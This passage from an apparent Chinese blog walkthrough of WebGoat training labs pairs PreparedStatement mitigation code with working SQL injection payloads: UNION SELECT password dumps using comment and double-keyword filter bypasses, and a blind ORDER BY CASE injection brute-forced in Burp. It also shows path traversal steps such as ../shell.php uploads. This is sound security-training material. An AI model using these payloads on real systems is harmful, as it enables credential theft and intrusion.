<li>这个说法也是不正确的。实际上，这段代码会首先尝试将’Robert’插入到某个字段中，然后执行删除&quot;Students&quot;表的命令。</li>
</ul>
</li>
<li><strong>Solution 4: The database registers ‘Robert’ ); DROP TABLE Students;–'.</strong>
<ul>
<li>这个说法是正确的。如果数据库没有采取适当的预防措施，这段代码将尝试首先将’Robert’插入到某个字段中，然后执行删除&quot;Students&quot;表的命令。–`部分是为了防止SQL解析器将其余部分视为注释。</li>
</ul>
</li>
</ol>
<p>最总答案：43234</p>
<h3 id="3-SQL-Injection-mitigation-（SQL注入缓解）">3.SQL Injection(mitigation)（SQL注入缓解）</h3>
<h4 id="1-4">1-4</h4>
<p>介绍如何减小SQL注入的缺陷，使用PreparedStatement</p>
<p>贴一下源码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Parameterized Queries - Java Snippet参数化查询（java代码片段）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> bool <span class="title function_">isUsernameValid</span><span class="params">(string username)</span> &#123;</span><br><span class="line">    <span class="type">RegEx</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Regex</span>(<span class="string">&quot;^[A-Za-z0-9]&#123;16&#125;$&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> r.isMatch(username);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// java.sql.Connection conn is set elsewhere for brevity.</span></span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">RecordSet</span> <span class="variable">rs</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    pUserName = request.getParameter(<span class="string">&quot;UserName&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( isUsernameValid (pUsername) ) &#123;</span><br><span class="line">        ps = conn.prepareStatement(<span class="string">&quot;SELECT * FROM user_table</span></span><br><span class="line"><span class="string">                                   WHERE username = ? &quot;</span>);</span><br><span class="line">        ps.setString(<span class="number">1</span>, pUsername);</span><br><span class="line">        rs = ps.execute();</span><br><span class="line">        <span class="keyword">if</span> ( rs.next() ) &#123;</span><br><span class="line">            <span class="comment">// do the work of making the user record active in some way</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// handle invalid input &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (...) &#123; <span class="comment">// handle all exceptions ... &#125;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Parameterized Queries - Java Example（java案例）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">loadAccount</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// Parser returns only valid string data</span></span><br><span class="line">  <span class="type">String</span> <span class="variable">accountID</span> <span class="operator">=</span> getParser().getStringParameter(ACCT_ID, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT first_name, last_name, acct_id, balance FROM user_data WHERE acct_id = ?&quot;</span>;</span><br><span class="line">  <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(query)) &#123;</span><br><span class="line">     statement.setString(<span class="number">1</span>, accountID);</span><br><span class="line">     <span class="type">ResultSet</span> <span class="variable">results</span> <span class="operator">=</span> statement.executeQuery();</span><br><span class="line">     <span class="keyword">if</span> (results != <span class="literal">null</span> &amp;&amp; results.first()) &#123;</span><br><span class="line">       results.last(); <span class="comment">// Only one record should be returned for this query</span></span><br><span class="line">       <span class="keyword">if</span> (results.getRow() &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">         data = processAccount(results);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="comment">// Handle the error - Database integrity issue</span></span><br><span class="line">       &#125;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="comment">// Handle the error - no records found &#125;</span></span><br><span class="line">     &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (SQLException sqle) &#123;</span><br><span class="line">    <span class="comment">// Log and handle the SQL Exception &#125;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ai给出的解释：</p>
<p><code>PreparedStatement</code> 是 Java JDBC 中的一个接口，它表示一个预编译的 SQL 语句。预编译的 SQL 语句可以在多次执行时重复使用，这可以提高执行效率。此外，<code>PreparedStatement</code> 还可以防止 SQL 注入攻击，因为它允许你将参数作为预编译语句的一部分，而不是直接将参数嵌入到 SQL 语句中。</p>
<p>使用 <code>PreparedStatement</code> 的主要好处是：</p>
<ol>
<li><strong>性能优化</strong>：预编译的 SQL 语句只需要被解析和编译一次，然后可以多次执行。这通常比使用 <code>Statement</code> 对象更快，因为它避免了重复的解析和编译开销。</li>
<li><strong>防止 SQL 注入</strong>：通过使用参数化查询，你可以避免 SQL 注入攻击。当使用 <code>PreparedStatement</code> 时，参数值不会被解释为 SQL 代码，而是作为数据传递，从而提高了安全性。</li>
<li><strong>灵活的查询</strong>：你可以使用 <code>PreparedStatement</code> 的 <code>setXXX()</code> 方法（例如 <code>setString()</code>, <code>setInt()</code>, <code>setDouble</code> 等）来设置参数值，这使得查询更加灵活和易于管理。</li>
</ol>
<p>以下是一个简单的示例，演示如何使用 <code>PreparedStatement</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PreparedStatementExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/mydatabase&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> <span class="string">&quot;username&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;password&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;John&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">email</span> <span class="operator">=</span> <span class="string">&quot;john@example.com&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT status FROM users WHERE name=? AND mail=?&quot;</span>;</span><br><span class="line">            <span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line">            ps.setString(<span class="number">1</span>, name);</span><br><span class="line">            ps.setString(<span class="number">2</span>, email);</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> ps.executeQuery();</span><br><span class="line">            <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Status: &quot;</span> + rs.getString(<span class="string">&quot;status&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上面的示例中，我们首先创建一个到数据库的连接，然后准备一个预编译的 SQL 查询。接下来，我们使用 <code>setString()</code> 方法为占位符设置值，并执行查询。最后，我们遍历结果集并打印出状态信息。</p>
<h4 id="5-6">5.</h4>
<p>您可以在下面看到一些代码，但这些代码不完整。完成代码，使其不再容易受到 SQL 注入的攻击！使用您之前学过的类和方法。</p>
<p>代码必须根据用户的名称和邮件地址检索用户的状态。名称和邮件均采用字符串格式。</p>
<p>根据题意，使用PreparedStatement查询数据库</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这行代码使用DriverManager类的getConnection方法来建立与数据库的连接。它需要三个参数：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">`DBURL`：数据库的URL或地址。</span>  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">`DBUSER`：用于连接到数据库的用户名。</span>  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">`DBPW`：用于连接到数据库的密码。通过这些参数，代码尝试与数据库建立连接，并将返回的`Connection`对象存储在名为`conn`的变量中。</span></span><br><span class="line">Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这行代码创建了一个PreparedStatement对象。PreparedStatement是用来执行参数化SQL查询的。这里，它创建了一个查询，该查询从名为“<span class="built_in">users</span>”的表中选择“status”字段，其中“name”和“mail”字段的值必须与给定的参数匹配。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> `?`：这些是参数占位符。在后续的代码中，我们将使用`setString`方法为这些占位符设置实际的值。使用参数化查询的好处是可以防止SQL注入攻击，并且可以更有效地与数据库通信。</span></span><br><span class="line">PreparedStatement ps = conn.prepareStatement(&quot;SELECT status FROM users WHERE name</span><br><span class="line">? AND mail=?&quot;);</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这行代码为第一个参数占位符设置了值。它将第一个占位符的值设置为变量name的值。在这个上下文中，我们可以认为这是将查询中的“name”字段的值设置为某个特定的用户名。</span></span><br><span class="line">ps.setString(1, name);</span><br><span class="line">ps.setString(2, mail);</span><br></pre></td></tr></table></figure>
<h4 id="6-4">6.</h4>
<p>试试吧！编写安全代码<br>
现在是时候编写自己的代码了！ 您的任务是使用 JDBC 连接到数据库并从中请求数据。</p>
<p>要求：</p>
<ol>
<li>
<p>连接到数据库</p>
</li>
<li>
<p>对不受 SQL 注入攻击的数据库执行查询</p>
</li>
<li>
<p>查询需要包含至少一个字符串参数</p>
</li>
</ol>
<p>开始之前的一些提示：<br>
要连接到数据库，您可以简单地假设给定的常量 DBURL、DBUSER 和 DBPW。<br>
查询的内容无关紧要，只要 SQL 有效且满足要求即可。<br>
您编写的所有代码都将插入到已导入 java.sql.* 的名为“TestClass”的 Java 类的 main 方法中。</p>
<p>没有足够的创意来思考自己的问题？您尝试从名为 users 的虚构数据库表中检索具有特定名称的用户的数据怎么样？</p>
<p>例如：下面的代码可以编译而不会出现任何错误（但当然不符合完成本课的要求）。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    Connection conn = null;</span><br><span class="line">    System.out.println(conn);   //should output &#x27;null&#x27;</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">    System.out.println(&quot;Oops. Something went wrong!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用您的知识，在下面的编辑器窗口中从头开始编写一些有效的代码！ （如果您无法在那里输入，调整一次浏览器窗口的大小可能会有所帮助，那么它应该可以工作）：</p>
<p>因为已经导入所有包了，现在只需要写主要代码就行了</p>
<p>主要不要忘记<code>ResultSet res = ps.executeQuery();</code>施行查询操作</p>
<blockquote>
<p><code>ResultSet res = ps.executeQuery();</code> 是在Java的JDBC（Java Database Connectivity）编程中常见的一行代码，它执行一个SQL查询并返回一个<code>ResultSet</code>对象。</p>
<ul>
<li><code>ps</code> 是一个 <code>PreparedStatement</code> 对象，它包含了一个预编译的SQL查询。</li>
<li><code>executeQuery</code> 是 <code>PreparedStatement</code> 的一个方法，用于执行查询并返回一个 <code>ResultSet</code> 对象。</li>
<li><code>ResultSet</code> 对象包含了查询的结果集，你可以使用 <code>ResultSet</code> 的方法来获取和处理查询返回的数据。</li>
</ul>
<p>具体来说，这一行代码执行SQL查询，并将结果存储在<code>res</code>变量中，然后你可以使用这个 <code>ResultSet</code> 对象来处理查询返回的数据。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">    Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);</span><br><span class="line">    String sql = &quot;select * from users where name = ?&quot;;</span><br><span class="line">    PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">    ps.setString(1, &quot;name&quot;);</span><br><span class="line">    ResultSet res = ps.executeQuery();</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">    System.out.println(&quot;Oops. Something went wrong!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="7">7</h4>
<p>上面是java，<a target="_blank" rel="noopener" href="http://xn--3dsq36aj9j.net">现在是.net</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Parameterized Queries - .NET</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> bool <span class="title function_">isUsernameValid</span><span class="params">(string username)</span> &#123;</span><br><span class="line">	<span class="type">RegEx</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Regex</span>(<span class="string">&quot;^[A-Za-z0-9]&#123;16&#125;$&quot;</span>);</span><br><span class="line">	Return r.isMatch(username);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SqlConnection conn is set and opened elsewhere for brevity.</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="type">string</span> <span class="variable">selectString</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM user_table WHERE username = @userID&quot;</span>;</span><br><span class="line">	<span class="type">SqlCommand</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlCommand</span>( selectString, conn );</span><br><span class="line">	<span class="keyword">if</span> ( isUsernameValid( uid ) ) &#123;</span><br><span class="line">		cmd.Parameters.Add( <span class="string">&quot;@userID&quot;</span>, SqlDbType.VarChar, <span class="number">16</span> ).Value = uid;</span><br><span class="line">		<span class="type">SqlDataReader</span> <span class="variable">myReader</span> <span class="operator">=</span> cmd.ExecuteReader();</span><br><span class="line">		<span class="keyword">if</span> ( myReader ) &#123;</span><br><span class="line">			<span class="comment">// make the user record active in some way.</span></span><br><span class="line">			myReader.Close();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123; <span class="comment">// handle invalid input &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception e) &#123; <span class="comment">// Handle all exceptions... &#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="9-2">9.</h4>
<p>给了个文章让我们去看</p>
<p><a target="_blank" rel="noopener" href="https://twitter.com/marcan42/status/1238004834806067200?s=21">https://twitter.com/marcan42/status/1238004834806067200?s=21</a></p>
<p>但是我去看的时候发现文章没了。。。</p>
<p>直接看题吧</p>
<p>通过尝试发现过滤了空格</p>
<p>我们直接其他符号绕过就行了</p>
<p>我用的是 <code>/**/</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27;/**/UNION/**/SELECT/**/userid,user_name,/**/password,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,1/**/from/**/user_system_data--&#x27;</span><br></pre></td></tr></table></figure>
<p>然后用<code>//</code>注释符号也行</p>
<h4 id="10-2">10.</h4>
<p>我们先尝试输入</p>
<p>发现每一次输入select 和 from在返回的结果中都会消失</p>
<p>说明这题除了过滤了空格，也过滤了关键字，即select，from，我们双写绕过就行了</p>
<p>原理：他只会过滤一次，即SELselectECt过滤一次会变成select，从而达到绕过的效果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27;/**/UNION/**/SELselectECT/**/userid,user_name,/**/password,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,1/**/frfromom/**/user_system_data--&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="12-2">12.</h4>
<p>在此分配中，尝试通过 ORDER BY 字段执行 SQL 注入。 尝试找到服务器的 ip 地址，猜测完整的 IP 地址可能需要太长时间，因此我们为您提供最后一部分：webgoat-prdxxx.130.219.202</p>
<p>注意：此分配的提交字段不容易受到 SQL 注入的影响。</p>
<p>根据提示去按排序按钮，然后抓包，发现请求是get</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/11.png" alt=""></p>
<p>发送给repeater，通过修改column发现排序是按值来的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/12.png" alt=""></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/13.png" alt=""></p>
<p>输入非法字符报错，发现表名是servers</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/14.png" alt=""></p>
<p>构造ORDER BY语句<br>
①根据上一章节11说过，有order by (case when (true/false) then ip else hostname end<br>
when为true，以ip排序。为false，以hostname排序。这两个字段的排序可以直接在网页上点击排序按钮查看。<br>
②之前的SQL注入中，我们使用过substr(ip,1,1)=’1’语句，返回值是boolean类型，符合①<br>
③如果直接将②语句嵌套到①中的when (①)的话，这里的ip是网页上的四个ip，webgoat-prd服务器还是被隐藏着，所以我们要把②中的“ip”替换成“select ip from servers where hostname=’webgoat-prd’”。<br>
根据③②①结合得到ORDER BY语句如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY (CASE WHEN (substr((select ip from servers where hostname=&#x27;webgoat-prd&#x27;),1,1)=&#x27;1&#x27;) THEN (ip) ELSE (hostname) END)</span><br></pre></td></tr></table></figure>
<p>然后发送到intruder模块爆破</p>
<p>手动替换“,”=“%2C”，空格替换为“+”号</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/15.png" alt=""></p>
<p>选择Cluster bomb，在第一个1和最后一个1标记</p>
<p>因为只需要爆破前三个ip值（后面的题目给了），然后后面值都是0-9，如此设置</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/17.png" alt=""></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/17.png" alt=""></p>
<p>然后爆破，查看response部分，如果排序是按ip则正确</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/18.png" alt=""></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/19.png" alt=""></p>
<p>最后可以得出IP为104.130.219.202</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/20.png" alt=""></p>
<h3 id="4-Path-traversal-路径遍历">4.Path traversal(路径遍历)</h3>
<h4 id="1-2">1.</h4>
<p>Path traversal<br>
A path(directory) traversal is a vulnerability where an attacker is able to access or store files and directories outside the location where the application is running. This may lead to reading files from other directories and in case of a file upload overwriting critical system files.</p>
<p>How does it work?<br>
For example let’s assume we have an application which hosts some files and they can be requested in the following format: now as an attacker you are interested in other files of course so you try . In this case you try walk up to the root of the filesystem and then go into to gain access to this file. The is called dot-dot-slash which is another name for this attack.<a target="_blank" rel="noopener" href="http://example.com/file=report.pdfhttp://example.com/file=../../../../../etc/passwd/etc/passwd../">http://example.com/file=report.pdfhttp://example.com/file=../../../../../etc/passwd/etc/passwd../</a></p>
<p>Of course this is a very simple example and in most cases this will not work as frameworks implemented controls for this, so we need to get a little more creative and start encoding before the request is sent to the server. For example if we URL encode you will get and the web server receiving this request will decode it again to …/…/%2e%2e%2f…/</p>
<p>Also note that avoiding applications filtering those encodings double encoding might work as well. Double encoding might be necessary in the case where you have a system A which calls system B. System A will only decode once and will call B with the still encoded URL.</p>
<p>路径遍历<br>
路径（目录）遍历是一种漏洞，攻击者能够访问或存储外部的文件和目录 应用程序运行的位置。这可能会导致从其他目录读取文件，如果是文件，则会导致读取文件 上传覆盖关键系统文件。</p>
<p>它是如何工作的？<br>
例如，假设我们有一个应用程序，它托管了一些文件，并且可以在下面请求它们 格式： 现在，作为攻击者，您当然对其他文件感兴趣，所以 你试试.在这种情况下，您尝试爬到文件系统的根目录 然后进入以获取对此文件的访问权限。称为点-点-斜杠，这是另一个名称 对于这次攻击。<code>http://example.com/file=report.pdfhttp://example.com/file=../../../../../etc/passwd/etc/passwd../</code></p>
<p>当然，这是一个非常简单的示例，在大多数情况下，这不会作为框架实现的控件 因此，我们需要更有创意，并在请求发送到服务器之前开始编码。 例如，如果我们对 URL 进行编码，您将得到并且接收此请求的 Web 服务器将解码 它再次更改为 …/…/%2e%2e%2f…/</p>
<p>另请注意，避免应用程序过滤这些编码的双重编码也可能有效。双重编码 如果系统 A 调用系统 B，则可能需要系统 A。系统 A 只会解码一次，并且 将使用仍编码的 URL 调用 B。</p>
<h4 id="2-4">2.</h4>
<p>上传文件，发现上传文件和FullName有关，即我们能控制上传文件位置</p>
<p>修改成<code>../</code></p>
<p>只要不是正确的位置都能通过</p>
<h4 id="3-5">3.</h4>
<p>过滤了<code>../</code></p>
<p>但是没有关系，我们换成<code>../</code>就能通过了</p>
<h4 id="4-4">4.</h4>
<p>这题就需要抓包了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/25.png" alt=""></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/24.png" alt=""></p>
<p>通过返回的数据可以看出储存的位置适合shell.php有关的，我们换成<code>../shell.php</code>就行了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/23.png" alt=""></p>
<h4 id="5-7">5.</h4>
<p>使用路径遍历检索其他文件<br>
路径遍历不仅限于文件上传，在检索文件时，路径遍历也可能是 可以从系统中检索其他文件。在此作业中，尝试查找一个名为path-traversal-secret.jpg</p>
<p>还是得抓包</p>
<p>按Show random cat picture后抓包</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/26.png" alt=""></p>
<p>通过返回的数据可以知道<code>?id=9.jpg</code>可以控制文件路径</p>
<p>我们照葫芦画瓢换成<code>../</code>提心非法字符、</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/27.png" alt=""></p>
<p>既然这样我们选择要转换的位置右键选择转换选择-&gt;URL-&gt;URL编码所有字符就能自动转换了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/28.png" alt=""></p>
<p>然后就是一步一步找了，在<code>../../</code>文件位置找到(记得转换字符)</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/29.png" alt=""></p>
<p>把id的值换成这个<code>../../path-traveral-secert</code>(记得转换字符，而且这里需要把jpg去掉才行，否则不行，我这里没想明白。。。有评论区大佬请告知)，然后就知道flag就似乎你的用户名用sha-512加密就行了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/30.png" alt=""></p>
<h4 id="7-2">7.</h4>
<p>Zip Slip 分配<br>
